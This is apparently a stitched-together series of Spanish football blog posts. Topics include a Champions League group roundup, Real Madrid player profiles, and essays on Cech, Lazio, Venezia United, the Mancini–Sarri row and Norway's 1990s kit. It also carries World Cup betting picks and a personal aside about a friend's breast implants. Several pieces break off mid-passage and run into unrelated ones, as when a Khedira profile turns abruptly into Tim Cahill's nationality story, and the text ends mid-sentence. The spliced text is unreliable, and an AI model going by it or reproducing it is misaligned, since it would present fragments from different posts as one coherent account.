portugueses, que han firmado un torneo muy discreto, mantendrán la plaza de Europa League siempre que el Hapoel no gane; en caso de victoria de los voluntariosos israelíes el Benfica también deberá ganar su partido.Grupo C:  El Valencia ha ganado tranquilidad a todos los niveles tras su paliza al débil Bursaspor, y se jugará el liderazgo en Old Trafford; ganar le proporciona la privilegiada plaza, mientras que empate o derrota se la otorgan a un ManU que deberá crecer bastante si quiere aspirar a algo en esta competición. El Rangers emigra seguro a la Europa League tras su enésima decepción a nivel europeo, mientras que los turcos han ganado experiencia en una competición que claramente está por encima de su nivel, y que buscarán un honorífico primer punto frente a los protestantes de Glasgow.Grupo D:  Sin hacer una gran fase de clasificación, el Barcelona se aseguró anoche la primera plaza del grupo frente a un ruinoso Panathinaikos al que ya había goleado en el Camp Nou, y cuya presencia en Europa finaliza con el próximo choque ante el Rubin. Para clasificarse, los rusos necesitan un punto más de los que consiga el Copenhague en el Camp Nou; y obviamente, una victoria de los sorprendentes daneses los lleva a octavos. Se lo merecerían, pues los de Solbakken han animado mucho la primera fase.Grupo E: El Bayern ejerció su dominio con puño de hierro durante las cuatro primeras jornadas, hasta el punto de que ni siquiera la inesperada remontada de la Roma en el Olimpico le ha privado del primer puesto matemático. Los italianos han ido de menos a más, y les basta un punto en su visita a Transilvania para lograr el pasaporte a la siguiente ronda; sólo en caso de derrota y victoria del Basel en el Allianz pasarían los alegres suizos. El Cluj ha cumplido con sus tres puntos, y se sigue afianzando en la máxima competición.Grupo F: El Chelsea no ha tenido rival, y es el único conjunto de los 32 que aún puede aspirar al pleno de puntos. Le acompañará en su periplo por octavos el Olympique de Marsella, que ha anotado diez goles en sus últimos dos partidos fuera de casa, y que con el 0-3 de esta jornada en Moscú –de locura el golazo de Valbuena– ha asegurado su clasificación. El otrora poderoso Spartak jugará la Europa League, y el debutante Zilina eslovaco al menos se quedará con la buena imagen de Stamford Bridge, después del descalabro (0-7) sufrido en el anterior partido. Grupo G:  En un grupo donde sus integrantes sumaban veinte copas de Europa en total, el Madrid se ha erigido como dominador nato, tanto en resultados como en juego. El 0-4 en Amsterdam certifica el primer puesto, y de paso deja en bandeja la clasificación al Milan, más gris en Europa que en su campeonato doméstico. El Ajax, sombra de otros tiempos, deberá esperar que el Auxerre no saque un punto más que ellos en la última jornada, en la que ambos visitan los feudos de los dos colosos. Si esto ocurre, se clasificará el modesto equipo francés, que ha pasado por el torneo sin pena ni gloria.Grupo H: La irregularidad del Arsenal ha igualado a la baja este grupo, el único donde aún no se ha clasificado matemáticamente ningún equipo para octavos, y donde el examen de posibilidades debe ser un poco más extenso. Si el Shakhtar gana o empata en Donetsk con el Braga, es primero de grupo, y el segundo será el Arsenal siempre que saque al menos los mismos puntos que el Braga en su partido en el Emirates contra el Partizan; en otro caso entrarían los lusos como segundos. Si el Braga vence en Ucrania y el Arsenal no gana, pasan Shakhtar y Braga, con el primero como líder siempre que la victoria sea por menos de tres goles de diferencia, o por 0-3; si es por 1-4, 2-5, etc. o por más, campeón el Braga (ya hizo una machada parecido en Sevilla). Finalmente, si gana el Braga en Donetsk y el Arsenal –lo lógico- en casa, hay un triple empate a puntos. Manda en este caso la diferencia de goles en enfrentamientos directos, que es +7 para los gunners, 0 para Shakhtar y -7 para Braga, con lo cual en condiciones normales entrará Arsenal como primero y Shakhtar como segundo. Que se clasifiquen estos dos es, sin duda, lo más probable. Hoy nos toca un momento divertido, vivido en el Mundial de Alemania 74 en el partido entre Brasil y Zaire. La primera selección del África negra que participaba en un Mundial había comenzado con decencia frente a Escocia (0-2)  para luego ser destrozada por los yugoslavos (0-9). Se especulaba con qué le haría Brasil a los zaireños, pero al final lo que ha quedado del partido para la posteridad no es el resultado, sino el desquiciamiento del zaguero Ilunga Mwepu, que de repente sufre un trastorno mental transitorio y patea hacia el limpio cielo el tiro libre que debían lanzar los sudamericanos. Todo un momento irrepetible. Calentando motores para el clásico en fascículos que comienza esta noche, os ofrecemos un breve perfil de los protagonistas de los duelos. Comenzamos con el Madrid.Casillas: Ni su mejor ni su peor temporada, da la impresión de haber tocado techo. Será siempre el santo por sus reflejos felinos, su ángel en las grandes ocasiones y su frialdad en el mano a mano, pero no parece que vaya nunca a pasar de ser un portero correcto por alto y con deficiente juego de pies. Menos decisivo y necesario que otras temporadas por la consistencia de la zaga.Marcelo: El año de la confirmación. Nunca se alejará demasiado de la vulgaridad como defensor, pero su producción ofensiva se ha incrementado de tal modo que ahora mismo ofrece al equipo un poder en el flanco zurdo que hacía años que no se disfrutaba en el Bernabéu. Insistente, profundo y afilado, ha mejorado en los centros, ha ganado en consistenca y comprende mucho mejor el juego. Le ha beneficiado la organización del equipo y que Di María mantenga ocupado con frecuencia al lateral contrario. A día de hoy es más necesario que otros jugadores con más nombre.Arbeloa. Tan discreto y cumplidor como siempre, el más empanado del vestuario madridista sigue construyendo una carrera en principio impensable para un futbolista de tan discretas cualidades técnicas. Juega mucho en su favor poder jugar por las dos bandas, y su consistencia defensiva le da cierta chance para tener minutos en los próximos clásicos. Más duro de lo que parece, recuerda un poco a Chendo en algunos aspectos.Pepe. Llamado a ser el nuevo Hierro desde que un día asombrara en el Nou Camp por su jerarquía, velocidad y capacidad de anticipación, el poderoso defensa de Maceió está perdiendo la categoría de indiscutible y el aprecio de su afición por su juego subterráneo, su violencia a veces excesiva y, sobre todo, la sensación de inmadurez que le convierte por momentos en una bomba de relojería. Siempre defendido por Mourinho, le ha perjudicado el culebrón de su renovación. Más cualidades que cabeza.Carvalho. Llegado al Madrid de la mano de un Mou que siempre ha sacado de él lo mejor como futbolista, es uno más de la lista de ilustres veteranos que ofrecen al Real Madrid buen rendimiento al final de sus carreras. Sobrio y tranquilo, infranqueable por alto, sabio en la colocación y con criterio para irse al ataque cuando las circunstancias lo requieren, está firmando –a pesar de un pequeño bajón en la segunda vuelta- una gran temporada. Será baja en la primera semifinal de Champions.Albiol. Menos presente que en la temporada pasada en la que lo jugó prácticamente todo, el central valenciano se ha afianzado en la plantilla en una temporada difícil para él. Llegó de puntillas arrastrando una cierta fama de defensa blando y poco expeditivo, pero ha resultado la viva imagen de la regularidad, y apenas se le recuerdan fallos. Perjudicado por la lesión de principios de temporada, no es una herejía afirmar que está para discutirle la titularidad a Pepe.Sergio Ramos. Una sombra del futbolista que llegó al Madrid y del que rayó a un nivel excepcional en las temporadas de Capello y Schuster, el de Camas ha visto recortadas esta temporada sus prestaciones atacantes, sin que ello haya repercutido en una mejora a nivel defensivo. Tácticamente desordenado y víctima demasiado frecuente de extremos hábiles, cada vez parece más que o es central o no es nada. El problema suyo, y sobre todo del Madrid, es que el overbooking de centrales se corresponde con escasez de laterales. Ya no se oyen ofertas por él.Lass. Anárquico por naturaleza, aislado en el vestuario y bastante conflictivo, el antiguo lateral del Chelsea suele ofrecer buenas prestaciones frente a equipos medianos, y naufragar en los partidos de enjundia por su escaso conocimiento de la posición de medio centro. Buen futbolista en espacios cortos y bastante resistente a pesar de su escasa estatura, ha repuntado algo en los últimos partidos tras una primera vuelta para olvidar. De vez en cuando deja algún detalle técnico de altura, pero no le queda demasiado recorrido en el Madrid. No estará hoy por lesión.Khedira. Favorecido por su pertenencia a la estupenda selección alemana del Mundial, llegó al Madrid con la vitola de jugador sólido y disciplinado, solidario y con llegada, aroma box to box.Dos años más tarde, en enero del año 2004, FIFA decidió cambiar sus reglas de elegibilidad para permitir a aquellos futbolistas con doble nacionalidad que hubiesen incluso disputado partidos en categorías inferiores en representación de otra federación nacional decantarse por otra federación en categoría absoluta. Llegado el momento definitivo de optar por un combinado nacional concreto, Tim Cahill tomó la decisión de vestir los colores del país en el que había crecido y en el que se había formado como futbolista profesional. Diez años y tres Campeonatos del Mundo después, su ardor competitivo y su voracidad sobre el césped siguen haciendo de él un jugador de primer nivel y un rival temible en cualquier condición. Australia, que mientras pudo disponer de los servicios de Cahill sobre el césped plantó cara a Chile y Holanda, no volverá a disfrutar de él en un MundialPuedes comprar camisetas de Tim Cahill y de Australia en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Petr Cech es una foto que se difumina. Como Marty McFly en Regreso al Futuro, el cancerbero checo del Chelsea asiste impertérrito a la progresiva desaparición de su imponente estampa en la foto de familia de su equipo. Su esfuerzo por recuperarse vale de poco. Thibaut Courtois es, claro, el prepotente Biff Tannen seduciendo a marchas forzadas a una Lorraine que se sienta en el banquillo Blue y responde al nombre de José Mourinho. Cada atajada milagrosa del gigante belga, y acostumbra a unas cuantas por partido, emborrona un poquito más la imagen del coloso del casco protector en ese retrato de grupo de los londinenses. Ya han desaparecido las piernas y su tronco comienza a evaporarse mientras el portero excolchonero salva a su equipo ante el Leicester y dibuja una sonrisa de rendida admiración en los labios de su mentor. A Jose, a diferencia de Lorraine con el macarra de Biff, se le cae la baba con Thibaut.Ya no se respeta ni a los mitos vivientes porque los jóvenes cada vez dejan antes de ser jóvenes. Porque, frente al vigor de un veinteañero, un portero a los treinta y pocos ya está ‘en la recta final’ de su carrera y poco se puede esperar de él, más allá de alguna cantada y alguna que otra evidencia de que su agilidad no es la de antaño. Asusta pensarlo cuando has superado esa edad. La suplencia de Petr Cech no tiene mayor trasfondo que el meramente deportivo. Su rendimiento, sin ser malo, no alcanza a día de hoy para competir con el de Courtois, sin contar además con la proyección de este último y su firme candidatura a referencia mundial de la portería en la próxima década. Es el principal activo del Bridge y su técnico no es ajeno a ello. Mientras tanto, la página de Cech se acaba. Su foto de familia con sus compañeros del Chelsea, esa estampa que parecía eterna tras diez temporadas en Londres, se difumina. Puede, quién sabe, que encuentre un hueco por cubrir en cualquier otro retrato de grupo donde la competencia no sea tan feroz. En Inglaterra, en Francia, en Alemania. Seguro que en algún lado se abre alguna nueva oportunidad para el gigante de Pilsen mientras Biff, cambiando el guión original, estrecha la cintura de Lorraine mecido por la dulzona música de los Platters y consolida su inevitable romance.Puedes comprar camisetas de Petr Cech y del Chelsea en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Estamos en la primavera de 1987. Hace tan solo un año que un nuevo escándalo de calcioscomesse (apuestas ilegales en torno al fútbol) ha sacudido con extrema violencia los aparentemente sólidos cimientos del fútbol italiano llevándose por delante el honor y la credibilidad de un buen puñado de clubes y personajes relacionados con el mundo del fútbol. Entre otros muchos la Lazio, que ya había sido sancionada con un descenso a la Serie B a principios de década como consecuencia de la ejecución de las durísimas sanciones surgidas a raíz del Totonero, ha recibido un palo bastante considerable. Sancionada inicialmente con el descenso a la Serie C1 (por aquel entonces aún lamía sus heridas en el purgatorio de la Serie B), la posterior revisión del caso redujo el castigo a la reducción de nueve puntos. El equipo capitalino había arrancado aquella temporada 1986/87 con un considerable hándicap (piénsese en las victorias a dos puntos, y no a tres). Un lastre deportivo al que sus seguidores debían añadir el lógico escarnio y señalamiento que supone ser hincha de un club demostradamente tramposo y turbio. El año que se oteaba en el horizonte amenazaba seriamente ruina.Como era de esperar, la temporada se hizo durísima. Y no solo en lo deportivo. A ojos del público, la Lazio estaba disputando una categoría que no era la suya y se estaba beneficiando de la benevolencia y transigencia de un sistema que, muchos años más tarde, volvería a evidenciar nuevos focos de podredumbre. No es difícil imaginar que, en el esfuerzo por sobrevivir a aquel clima irrespirable y salvar el pellejo y el honor de la entidad, la familia laziale saldría fortalecida y recompuesta de aquella complicada experiencia. El club finalmente consiguió salvar la categoría en un final de temporada agónico tras salir airoso del playoff de descenso a Serie C1, al imponerse al Taranto y el Campobasso en un triangular por la permanencia. Un año más tarde, superadas todas las penurias y fortalecida en la desgracia, la vuelta de la Lazio a la Serie A sería una realidad.Aquel año guarda un significado muy especial para el hincha del conjunto romano, muy por encima incluso de los felices y exitosos años de la era Cragnotti. Fue el año de la supervivencia. De la heroicidad frente a la incensante adversidad. Del redoblar esfuerzos en lugar de bajar los brazos y dejarse arrastrar por la corriente. Y, desde entonces, el lado celeste de Roma tiene un estable madero en mitad del océano al que agarrarse cuando vienen mal dadas, una referencia a la que recurrir a la hora de valorar las penas y saborear los triunfos.Quizá por eso, porque la simbología de aquel año maldito pero con final feliz continua ejerciendo una influencia totémica entre la hinchada biancoceleste, el club ha decidido que nada mejor para celebrar el 115 aniversario de la fundación de la entidad que recuperar para la memoria de los más jóvenes la especialísima y reconocible camiseta de aquella temporada 1986/87. Una camiseta icónica con el imponente Aquilotto recobrando el vuelo desde el pecho de los futbolistas laziali, basada en un diseño de Marco Casoni, presidente del club a principios de aquella década de los ochenta. ‘Recuperar esta emblemática camiseta nos da la oportunidad de recordar una época dramática pero fundamental en nuestra historia. El Aquila es símbolo de orgullo, bravura y libertad‘, apunta el presidente y principal impulsor de la idea, Claudio Lotito. Sea una simple maniobra de merchandising o un reclamo sentimentaloide, la vuelta de la maglia del meno nove a muchos nos ha servido para recuperar un episodio que teníamos olvidado. Porque la historia, por mucho que algunos se empeñen, no tiene únicamente hueco para los triunfadores.Puedes comprar camisetas de la Lazio en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Las apuestas de Borja Barba Camerún-Brasil. Marca Brasil 3 o más goles. Cuota 1.72 Stake 4 PERDIDACamerún Brasil. Gana Brasil sin encajar un gol. Cuota 1.72 Stake 4 PERDIDAHolanda-Chile. Marcan ambos equipos. Cuota 1.53 Stake 5 PERDIDACreo que en toda mi trayectoria de apuestas en bwin, jamás había tenido una racha tan negativa como la de este Mundial de Brasil. Son cosas que a veces ocurren. Llegados a esta situación, el consejo es someterse a los menores riesgos posibles.Espoleado por su condición de local y jugando a favor de obra gracias al bajón físico y al fútbol control del Villarreal los andaluces tuvieron pinta de poder nivelar  la contienda hasta el último instante. Jesualdo buscó soluciones en el banquillo pero fue en vano. El cansancio evidente en alguno de sus efectivos más peligrosos tras el desgaste de jugar 45 minutos con un hombre menos y la insuficiente conexión entre sus futbolistas de medio campo hacia adelante junto con los chispazos de calidad de un Nilmar en estado de gracia terminaron por abocar el partido al 2-3 definitivo. Venecia es un sitio extraño y su equipo también. Basta con darse un paseo por la isla de Santa Elena, justo en un extremo donde la ciudad pierde el apelativo de tierra firme, y contemplar el muy infrafutbolero estadio Pierluigi Penzo alzándose como una lonja imposible y destartalada junto al canal. Basta ver la camiseta negra, naranja y verde. Rara. Basta saber que allí dio sus mejores tardes de fútbol una bella anomalía como Álvaro Recoba. El caso es que el Venezia, que ahora pena en la D  pese a gozar en los 90 del pertinente momento de gloria que el sacrosanto sistema de promociones reserva a los clubes modestos, ha vuelto a asomar la cabeza por las páginas deportivas de los diarios italianos por razones tan inverosímiles como exige el carácter del equipo. Y es que este verano, los hinchas de este club arruinado, hartos sin duda de sablistas y aprovechados, han decidido sentarse a la mesa adoptando el modelo inglés mediante lo que han bautizado como Venezia United: el accionariado popular del Venezia.Uno que es seguidor tirando a acérrimo del Real Oviedo comprende perfectamente el grado de cabreo e impotencia que ha llevado a la grada lagunari a tomar la decisión de gastarse los ahorros en su equipo. No obstante, nunca viene mal hacer un repaso. El declive del Venezia comienza en 2002 al perder el derecho a jugar en Serie A tras una temporada penosa. Tres entrenadores, la pelotita que no entraba…un desastre. Es entonces cuando el presidente Zamparini decide hacer las maletas y abandonar el equipo a su suerte. Ahora es propietario del Palermo, cuidad que consideró más cómoda para continuar su vocación de tycoon del fútbol. Salvador en 1987 y verdugo en 2002, Maurizio Zamparini cerró la puerta en Venecia dejando tras de sí una pila roñosa de proyectos sin completar (un estadio digno entre otros), amén de varios escándalos financieros y de compra de partidos que llevaron el equipo a la C2 y posteriormente a la D. A la quinta y mugrienta categoría del fútbol italiano.Ahí es cuando entra en juego la idea Venezia United. La criatura vino al mundo en junio del pasado verano con el objetivo de pesar en el accionariado del club, de insuflar vida al moribundo. De garantizar el sentimiento de pertenencia a un club que vivía en peligro de extinción  a golpe de despropósitos. Planean recaudar fondos hasta cubrir el 10% en el mapa accionarial, y ser el freno popular ante futuros desmanes del inversor futuro. De momento han reclutado a  mil miembros (pagan 10 euros por cabeza aunque las donaciones más cuantiosas no se ha hecho esperar) para la causa y cuentan con el apoyo expreso del presidente Enrico Rigoni. Ghea podemo far! es uno de los lemas del United y uno espera que sí, que lo consigan. Por varias razones. La primera y más importante, para que sienten jurisprudencia tirando del carro dignamente como en Manchester o en Wimbledon. La segunda para que el hincha italiano, causa de bastantes de los males que aquejan a su fútbol, recupere algo del crédito perdido. En cuanto el árbitro pitó el final del último duelo copero entre el Nápoles y el Inter la zona mixta subió de temperatura. De escenario habitual de las más anodinas respuestas a una mezcla de polvorín y púlpito ejemplarizante. En el foco, los entrenadores de ambos equipos. Roberto Mancini, visiblemente enfadado, acusó a Maurizio Sarri de racista y homófobo. “Sarri es un racista y gente como él debería estar fuera del fútbol. Me levanté para preguntarle al cuarto árbitro por qué se habían añadido cinco minutos. Él se levantó y me gritó ‘maricón’. Alguien de 60 años que actúa así es una vergüenza. Fui a buscarle al vestuario y se disculpó, pero quiero que se avergüence de lo que ha dicho. En Inglaterra, a alguien como él no le permitirían ni poner un pie en la banda” Cualquiera con dos dedos de frente entenderá el enojo de Mancini, cualquier persona cabal aplaudirá su valentía para denunciar un comportamiento lamentable. Cualquiera seguramente, menos el Mancini de 2007. Durante un Inter-Nápoles liguero, con Mancini en el banquillo local, la curva Nord del Meazza, donde ocupan localidad los ultras del equipo milanés, mostraron pancartas intolerables contra la afición napolitana. Quizá la más significativa, la que ha acabado siendo carne de meme fue aquella que identificaba a los napolitanos como tuberculosos, “Partenopei tubercolosi”, pero hubo más. En Italia siempre recuerdan la lona que describía a Nápoles como la cloaca de Italia. Por desgracia, esta forma de racismo es habitual en la eterna diferencia norte-sur que acostumbran a subrayar las gradas italianas, pero aquello fue tan grave que la justicia deportiva clausuró la curva durante una jornada. En cambio, cuando se le preguntó al técnico interista por el asunto decidió adoptar un discurso tibio, muy alejado de su última y encendida versión. Calificó aquello de “simples burlas” y cargó contra los periodistas acusándoles de falsos moralistas. Se defendió explicando que a Materazzi también le insultan allí donde pone un pie.Cualquiera, también el propio Sarri, coincidirá con Mancini en que acabar con el racismo, la homofobia y la mala educación en los estadios debe ser una prioridad para todos. Cualquiera entenderá también que la lucha debe ser constante, no un desahogo aislado cuando el problema te toque de cerca. Dídac Lee, directivo y gurú en el área de nuevas tecnologías del Barcelona, recuerda en la última entrada de su blog personal que una de las claves en la gestión de personas es aceptar como son y no como nos gustaría que fueran. Tiene más razón que un santo pero ¿llegó a la conclusión antes o después de conocer a Sandro Rosell? . Lo saco a colación del enésimo relevo en el departamento de comunicación del Barça, parcela con el que Dídac Lee colabora estrechamente. Con Xavier Martín, contratado este mes, ya son tres los directores de comunicación investidos por Rosell en año y medio. Otro récord más al saco blaugrana.El ex-director general de la agencia de comunicación TAPSA, sucede a Pere Jansà y a Ketty Calatayud en la titánica misión de organizar el mensaje Barça.Si algo hemos aprendido con Florentino es que en este Madrid, como en el Kellerman’s Mountain House Resort, todo es posible. Dividir las rondas eliminatorias de la Champions League nos anima a disfrutar de partidos que, simultaneados con conjuntos españoles o equipos de más relumbrón, no veríamos. Hoy juega el Barça frente al Stuttgart, pero también juega el Girondins lejos de su casa. El equipo francés está en un momento dulce, líder de la Ligue 1 y habiendo barrido del mapa al hace pocos años imbatible Lyon. Su cruce ha sido, en la teoría, de los más fáciles, un Olympiakos algo titubeante en la liguilla que se aprovechado, principalmente, de la poca guerra que ha dado uno de los clubes llamados a agitar el campeonato, el Standard de Lieja. El equipo de Burdeos es favorito en las apuestas, pero en fútbol y en el infierno de Karaiskakis, todo será posible esta noche.El equipo ateniense nunca ha hecho mucho ruido en Europa, alcanzar unos cuartos en la 98/99 ha sido su hito continental. Sin embargo en la Super League griega su dominio ha sido prácticamente absoluto en los últimos veinte años. Esto puede hablar muy mal de su campeonato doméstico o muy mal del  propio equipo heleno y ese metus reverentialis de los clubes de segunda línea cuando deben salir al campo escuchando el himno de la Liga de Campeones.Las plantillas del Olympiakos siempre han sido peculiares. Tienen prácticamente lo mejor que va saliendo de las academias griegas por poderío económico, sin embargo, cuando miran al extranjero los fichajes pueden ser de lo más estrambótico. Raro fue ver como Raúl Bravo hizo la maleta y se marchó al campeón de El Pireo para encargarse de la banda izquierda, ese mismo año se marchó con ellos el colchonero Galletti. Después Maresca desembarcó allí desde el Sevilla, el joven delantero  Derbyshire desde el Blackburn Rovers, Mellberg de la Juventus, Óscar del Zaragoza o Dátolo del Napolés. Todos del mismo perfil, jugadores de grandes ligas para las que por edad o por falta de progresión se han quedado pequeños. La plantilla del Olympiakos es heterogénea, descompensada, pero no renuncia al juego directo a través de futbolistas de presión y verticalidad como Dudu o LuaLua, sustentados por un centro del campo que tienen al italiano Maresca su hombre más inspirado.Recordaba a otros jugadores que han pasado por allí, como Rivaldo, Karembeu, Zahovic, Giovanni, jugadores del mismo perfil, rozando el estrellato futbolístico, sin más criterio me temo que el nombre y el recuerdo de lo que fueron, suficiente tal vez para destacar en una liga que pocas alegrías ha dado al fútbol continental.Volviendo al presente, Zico, el entrenador que los ha guiado hasta esta ronda eliminatoria, ya no está en el equipo. El bosnio Bandovic vino a sustituirlo para frenar la mala racha de resultados durante el diciembre pasado. El Girondins parece tenerlo fácil, por fútbol, por plantilla –siempre es un lujo contar con Gourcouff, Trémoulinas o Chamakh-, pero no hay que descartar algún ramalazo del Olympiakos, que juega en casa y bien calentito como acostumbra la afición griega. Quien sabe si entre Nikopolidis, Stoltidis o algunos de los nombrados podrán pinchar esta noche la burbuja de los girondinos. Una vez tuve sexo con una chica con las tetas operadas. Tenía curiosidad, lo confieso. La conocía de antes de operarse y viví el proceso de su operación. Sus tetas eran pequeñas, y siempre se quejaba. Le dije que era una locura, que era una chica preciosa y que pasar por un quirófano para eso era una frivolidad. No me hizo caso, claro. Estaba segura de que quería dos tetas nuevas, no explosivas, simplemente normales, que resaltaran con mínimos escotes. Tras la intervención me enseñó los puntos y pensé en la locura que suponía todo ese proceso médico sólo por estética. Cuando le quitaron los puntos, se trató con laser las cicatrices y la silicona se adaptó al cuerpo, se le quedaron unas tetas artificialmente bonitas. No muy grandes, demasiado tiesas quizás, pero equilibradas en su bonito cuerpo. Pero ella estaba bien antes. Me gustaba mucho antes. No me quitaba de la cabeza una idea: quien conozca a esta chica de siempre y la vea con una parte no suya ahí puesta, resaltando, qué pensará. A mí se me hacía raro. Pero su familia, sus amigos de siempre, viendo como la chica que era había cambiado. Me resultó un poco monstruoso, incómodo, por qué cambiar lo que estaba bien, qué lleva a alguien a manipular su esencia, su cuerpo original. Qué decirle si hace tiempo que no la ves. ¿Obviar sus tetas nuevas? ¿Hacer como que nada ha pasado? ¿Y si no te gustan? ¿Y si te gustaban sus minúsculas tetas de pezones duros en su cuerpo delgado? ¿Y si la operación te resulta grotesca y prefieres la naturalidad de un cuerpo con sus defectos y virtudes sin que la ciencia tenga nada que ver?Hoy se presenta la nueva equipación de España. Los pantalones azules ya no son azules. Ahora son rojos. Igual que la camiseta, igual que las medias. Un arañazo reciente en medio del césped. Un jugador del Liverpool. Una República Popular de España. Rojo y dorado, además. Señorial, ruso, de salón decimonónico, de cortina de la Duquesa de Alba. Rojo oscuro y dorado como si viviéramos en la opulencia. Horrible. Inadecuado. Traidor. Leo que la FIFA obliga, que las equipaciones monocromáticas ayudan a los árbitros y a los jugadores. Como en un futbolín de plástico, como dice Borja Barba, ahora somos muñecos del subbuteo recién sacados de la caja. Yo, que tuve un kit completo de Le Coq Sportif con medias negras, yo que aguanté la segunda camiseta dorada, yo que he visto en directo la sangre de Luis Enrique sobre la blanquísima y hermosa segunda equipación de España contra una Italia con calzón blanco aún, yo que odio a Chile por vestir como nosotros; no puedo tolerar semejante patada a mis colores.Jugar con los colores como jugamos nosotros con el editor del Pro. Como quinceañeros oportunistas. Y veo que Alemania irá de blanco, como Inglaterra en su día. Que Italia seguirá de azul. Que en Portugal no arreglan su chapuza. Todos abonados al color único, como alienados equipos echando pachangas en los sótanos de las cárceles de 1984. Un único color para vencerlos a todos.Como esa amiga hermosa que se opera las tetas.Jugar cantidades pequeñas (no queda otra, después de haberme quedado con 24 euritos en la cuenta) o ceñirse a resultados muy básicos, aun con una cuota baja. Las dos eliminatorias de cuartos de final del día 29 son, precisamente, dos de las, a mi juicio, más abiertas de todo el cuadro. México tira para arriba plena de autoconfianza y, siendo fiel reflejo de la gastronomía típica, no parece que vaya a ser un plato precisamente digestivo para la Holanda de van Gaal. No obstante, debe jugar contra la maldición del quinto partido…Holanda-México. Gana Holanda. Cuota 2.10 Stake 3Costa Rica-Grecia. Under 2.5 goles. Cuota 1.44 Stake 4Las apuestas de Sergio CortinaItalia-Uruguay. Gana Italia. Cuota 2.60. Stake 5 PERDIDAChile-Holanda. Gana Chile. Cuota 2.65. Stake 5 PERDDALlegamos a la tercera jornada del torneo apostador mudialista y ya estoy llorando por las esquinas. Soy el Brasil de este invento. No me queda mucha pasta en la cartera y lo malo es que la segunda ronda de octavos se presenta muy abierta. No veo un favorito claro en el Holanda-México, pese al momento de Robben, y tampoco en el Costa Rica-Grecia. Pese a todo, vamos allá.Holanda-México. Gana Holanda. Cuota 2.10 Stake 2Costa Rica-Grecia. Gana Costa Rica. Cuota 2.45 Stake 3Las apuestas de Pol GustemsAustralia – España. Menos de 2,5 goles. Cuota 2.45. Stake 5 FALLADAHolanda – Chile. Más de 2,5 goles. Cuota 1.75. Stake 5 FALLADAErramos por un gol en ambas apuestas, largos en el primero y cortos en el segundo. En cuanto a esta jornada, vamos con Holanda y con el empateHolanda gana media parte y final. Cuota 3.20. Stake 5Costa Rica – Grecia. Habrá prórroga. Cuota 3. Stake 5Las apuestas de Ramón FloresBrasil-Camerún. Se apuesta a victoria brasileña por 1-0, 2-0 o 3-0. Cuota 2.50. Stake 5. PERDIDA.Croacia-México. Se apuesta a empate. Cuota 3.40. Stake 5. PERDIDA.DDF es una piña, ya lo sabéis. Aquí ganamos o perdemos todos, y si hay que caer, con todo el equipo. Lo único bueno, que tras el batacazo de la semana pasada no nos queda sino mejorar. Mi remontada propia espero que empiece hoy a las 18 en el Estadio Castelao de Fortaleza: dos equipos de parecido potencial, con sangre y empaque, que se han batido con selecciones poderosas y han salido indemnes de la lucha. La apuesta normal será por un empate, pues, aunque nos cubrimos un poco las espaldas tomando en cuenta la victoria mexicana. Y aunque sea difícil de pronosticar, hay que dedicarle algo al Costa Rica-Grecia, que para eso se la han ganado estas naciones que no contaban para nadie antes de empezar. En tiempos de vacas gordas nos habríamos lanzado con el gol de Campbell, pero dados como estamos amarraremos algo más y pronosticaremos sólo victoria de Costa Rica.Pasará lo que pase, pero hasta ahora han demostrado tener bastante más fútbol que Grecia.Holanda-México. Apostamos por el empate, apuesta reembolsable si gana México. Cuota 2.45, Stake 5. Costa Rica-Grecia. Apostamos por la victoria del equipo centroamericano. Cuota 2.45. Stake 5. Nota: todas las apuestas se refieren al tiempo reglamentario. Si hoy hablas de Noruega lo tienes que hacer del chico ese, Odegaard y de su tournée en busca de un mejor postor al que ofrecer sus servicios. Cosas del fútbol moderno, que con dieciséis añitos ya te conoce medio planeta y ya te encumbran como el salvador del aletargado fútbol noruego. Pero nosotros éramos más de Solskjaer. De Bjornebye, de Mykland, de Henning Berg y de Ronny Johnsen. De fútbol rocoso.De fútbol pelirrojo y de mejillas sonrosadas. De futbolistas sin cincelar al detalle, pero con cuerpos graníticos bajo esos tremebundos camisetones de corte ancho y sisa holgada.Porque la Noruega de los años noventa fue, futbolísticamente, un Expediente X. Un caso de complicada clasificación. Un país que se dedicó a exportar jugadores de forma masiva hacia el por entonces aún simplemente pujante fútbol inglés, que gozó de unos años de cierto reconocimiento internacional con sus participaciones en el Mundial de EEUU en 1994 y de Francia en 1998, así como en la Eurocopa del 2000 y que posteriormente desapareció en la profundidad de los fiordos para no volver, hasta la fecha, a salir a superficie.Y nada ilustra mejor aquellos locos años del fútbol noruego que el estrambótico diseño que Umbro, en un alarde de ingenio y creatividad desbordante, pergeñó para el combinado vikingo. Nadando entre las aguas de la genialidad y la locura y llevando al paroxismo ese disparatado delirio que parecía regir las cabezas pensantes de los diseñadores de equipaciones deportivas en la década de los noventa, la firma de Cheadle cruzó definitivamente la línea con el uniforme que decidió colocar a los noruegos en la fase de clasificación para Francia’98. Esas mangas en las que parece que se acaba de ir la señal del UHF mientras giras la antena de cuernos en busca de señal y, sobre todo, esa reivindicación patriótica en Arial 140 que invade el pecho como una animación de Powerpoint caída directamente desde el monitor de un diseñador loco. Para redondear la jugada, y por si el pantagruélico tamaño de las Arial del pecho no era suficiente pancarta para la exaltación nacional, aún queda sitio libre para susurrar al espectador un discreto, ligero y tímido ‘NORGE‘, ahí donde el abdomen comienza a perder su púdico nombre.La camiseta extrasensorial de los noruegos tuvo un efecto demoledor, y no solo en lo meramente deportivo. El salto de década trajo consigo un cambio radical en la concepción estilística del uniforme nacional. Un giro de ciento ochenta grados hacia la sobriedad más absoluta, hacia un patrón modélico, sensato y amigable… aunque mucho más susceptible de ser pasado por alto.Puedes encontrar camisetas de la selección de Noruega (no aún de Odegaard) en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. ‘Si el Hertha finalmente descendiese de categoría, toda la ciudad de Berlín se sentiría de segunda clase, más pobre, más triste‘. Para el diario berlinés Der Tagesspiegel, que así se pronunciaba en la previa del definitivo duelo ante el Schalke 04 en aquel mes de abril de 2010, el de su penúltimo descenso a 2. Bundesliga, estaba claro que el fútbol en la capital alemana no era ni mucho menos una cuestión menor. Aquella desproporcionada boutade pretendía situar al fútbol en un lugar que nunca le ha correspondido dentro de la bulliciosa, estimulante y siempre atractiva Berlín. Porque ni el Hertha BSC tiene la exclusiva de la representación deportiva (ni siquiera futbolística) de la capital germana en los más altos niveles, ni la ciudad admite que su principal equipo de fútbol pueda ser considerado como un fiel representante de la variopinta sociedad berlinesa. Berlín es una ciudad, especialmente tras la reunificación y 